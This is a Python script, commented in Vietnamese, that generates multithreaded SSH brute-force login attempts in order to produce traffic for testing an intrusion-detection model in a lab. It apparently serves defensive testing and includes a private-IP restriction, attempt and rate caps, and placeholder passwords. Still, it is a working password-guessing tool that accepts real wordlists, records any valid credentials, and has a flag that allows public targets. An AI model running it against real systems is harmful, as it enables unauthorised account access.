#!/usr/bin/env python
"""Sinh traffic brute-force SSH để kiểm thử model IDS trong lab.

Mục tiêu là tạo *mẫu lưu lượng* brute-force (nhiều lần thử đăng nhập liên tiếp tới cùng một host),
cho model IDS phát hiện. KHÔNG nhằm bẻ khoá: wordlist mặc định là mật khẩu giả.

An toàn:
- Chỉ cho phép đích trong dải IP riêng (lab). Đổi bằng --allow nếu cần.
- Có --max để giới hạn số lần thử, --rate để giới hạn tốc độ.
- Dừng ngay khi đăng nhập đúng (nếu lỡ trúng mật khẩu thật thì thoát, không làm gì thêm).

Cách dùng:
  python ssh_bruteforce.py 192.168.1.182
  python ssh_bruteforce.py 192.168.1.182 --intensity aggressive --max 2000
  python ssh_bruteforce.py 192.168.1.182 -U wordlists/users.txt -P wordlists/passwords.txt
"""
import argparse
import ipaddress
import logging
import queue
import socket
import sys
import threading
import time
from pathlib import Path

import paramiko

HERE = Path(__file__).resolve().parent
# Cường độ: (số luồng, số lần thử mỗi giây tối đa cho toàn bộ). Khớp các tier của lab train.
INTENSITY = {
    "stealth": (1, 1),
    "low": (2, 5),
    "medium": (4, 20),
    "aggressive": (16, 0),  # 0 = không giới hạn tốc độ
}


def is_lab_target(ip, allow_public):
    try:
        address = ipaddress.ip_address(ip)
    except ValueError:
        return False
    return allow_public or address.is_private


def load_list(path, fallback):
    if path and Path(path).exists():
        return [line.rstrip("\n") for line in Path(path).read_text(encoding="utf-8", errors="replace").splitlines() if line]
    return fallback


def try_login(target, port, user, password, timeout):
    """Trả về 'ok' nếu đúng, 'bad' nếu sai, 'refused' nếu host từ chối/đóng kết nối."""
    sock = None
    transport = None
    try:
        sock = socket.create_connection((target, port), timeout=timeout)
        transport = paramiko.Transport(sock)
        transport.start_client(timeout=timeout)
        try:
            transport.auth_password(user, password)
            return "ok"
        except paramiko.AuthenticationException:
            return "bad"
    except (socket.timeout, socket.error, paramiko.SSHException, EOFError):
        return "refused"
    finally:
        if transport:
            try:
                transport.close()
            except Exception:
                pass
        if sock:
            try:
                sock.close()
            except Exception:
                pass


class Stats:
    def __init__(self):
        self.lock = threading.Lock()
        self.tried = 0
        self.refused = 0
        self.found = None
        self.start = time.time()

    def record(self, result, user, password):
        with self.lock:
            self.tried += 1
            if result == "refused":
                self.refused += 1
            if result == "ok" and not self.found:
                self.found = (user, password)
            return self.tried


def worker(jobs, stats, target, port, timeout, limiter, stop):
    while not stop.is_set():
        try:
            user, password = jobs.get_nowait()
        except queue.Empty:
            return
        if limiter:
            limiter.wait()
        result = try_login(target, port, user, password, timeout)
        count = stats.record(result, user, password)
        if result == "ok":
            stop.set()
            logging.info("DANG NHAP DUNG: %s / %s  (dung lai)", user, password)
            return
        if count % 50 == 0:
            rate = count / max(time.time() - stats.start, 1e-6)
            logging.info("da thu %d  (tu choi %d)  %.1f lan/giay", count, stats.refused, rate)
        jobs.task_done()


class RateLimiter:
    def __init__(self, per_second):
        self.interval = 1.0 / per_second
        self.lock = threading.Lock()
        self.next = time.time()

    def wait(self):
        with self.lock:
            now = time.time()
            if now < self.next:
                time.sleep(self.next - now)
            self.next = max(now, self.next) + self.interval


def main():
    parser = argparse.ArgumentParser(description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)
    parser.add_argument("target", help="IP mục tiêu trong lab")
    parser.add_argument("--port", type=int, default=22)
    parser.add_argument("--intensity", choices=list(INTENSITY), default="medium")
    parser.add_argument("-U", "--users", help="file user, mỗi dòng một tên")
    parser.add_argument("-P", "--passwords", help="file mật khẩu, mỗi dòng một mật khẩu")
    parser.add_argument("--max", type=int, default=1000, help="số lần thử tối đa")
    parser.add_argument("--rate", type=float, default=None, help="ép số lần thử mỗi giây (ghi đè intensity)")
    parser.add_argument("--threads", type=int, default=None, help="ép số luồng (ghi đè intensity)")
    parser.add_argument("--timeout", type=float, default=6.0)
    parser.add_argument("--allow-public", action="store_true", help="cho phép đích ngoài dải IP riêng (tự chịu trách nhiệm)")
    args = parser.parse_args()

    logging.basicConfig(level=logging.INFO, format="%(asctime)s %(message)s", datefmt="%H:%M:%S")
    sys.stdout.reconfigure(encoding="utf-8")

    if not is_lab_target(args.target, args.allow_public):
        logging.error("Tu choi: %s khong phai IP lab (dai rieng). Dung --allow-public neu that su muon.", args.target)
        return 2

    users = load_list(args.users, load_list(HERE / "wordlists" / "users.txt", ["admin", "root", "test", "user", "pi"]))
    passwords = load_list(args.passwords, load_list(HERE / "wordlists" / "passwords.txt", [f"pass{i}" for i in range(1, 401)]))

    threads, default_rate = INTENSITY[args.intensity]
    if args.threads:
        threads = args.threads
    rate = args.rate if args.rate is not None else default_rate
    limiter = RateLimiter(rate) if rate and rate > 0 else None

    jobs = queue.Queue()
    added = 0
    for password in passwords:
        for user in users:
            if added >= args.max:
                break
            jobs.put((user, password))
            added += 1
        if added >= args.max:
            break

    logging.info("Bat dau brute-force SSH -> %s:%d | %d user x %d mat khau, chay %d lan, %d luong%s",
                 args.target, args.port, len(users), len(passwords), added, threads,
                 f", gioi han {rate} lan/giay" if limiter else ", khong gioi han toc do")

    stats = Stats()
    stop = threading.Event()
    pool = [threading.Thread(target=worker, args=(jobs, stats, args.target, args.port, args.timeout, limiter, stop))
            for _ in range(threads)]
    for thread in pool:
        thread.start()
    try:
        for thread in pool:
            thread.join()
    except KeyboardInterrupt:
        stop.set()
        logging.info("Dung theo yeu cau.")

    elapsed = time.time() - stats.start
    logging.info("Xong: %d lan thu trong %.1f s (%.1f lan/giay), %d bi tu choi.",
                 stats.tried, elapsed, stats.tried / max(elapsed, 1e-6), stats.refused)
    if stats.found:
        logging.info("Tim thay thong tin dang nhap dung: %s / %s", *stats.found)
    else:
        logging.info("Khong co cap nao dung (binh thuong khi dung wordlist gia).")
    if stats.refused > stats.tried * 0.3:
        logging.warning("Nhieu ket noi bi tu choi: host co the chan hoac SSH khong mo. Kiem tra lai dich/cong.")
    return 0


if __name__ == "__main__":
    sys.exit(main())
